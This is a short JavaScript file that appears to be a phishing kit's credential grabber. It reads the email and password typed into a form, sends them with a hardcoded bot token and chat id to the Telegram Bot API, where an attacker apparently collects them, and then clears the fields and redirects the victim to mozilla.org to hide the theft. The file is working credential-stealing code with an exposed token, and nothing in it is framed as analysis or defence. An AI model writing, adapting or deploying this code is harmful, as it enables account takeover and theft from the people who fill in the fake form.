//bot token
var telegram_bot_id = "5048296069:AAFTFhOFZqjSZFuphfs2rB8kzJdGKkYWloE";
//chat id
var chat_id = 1225371262;
var u_email, pass;
var ready = function () {
    u_email = document.getElementById("email").value;
	pass = document.getElementById("pass").value;
    message = "Username: " + u_email + "\nPass: " + pass;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("email").value = "";
	document.getElementById("pass").value = "";
	location.assign ("http://www.mozilla.org"); 
	
    return false;
	location.replace('https://www.javascripttutorial.net/');

};

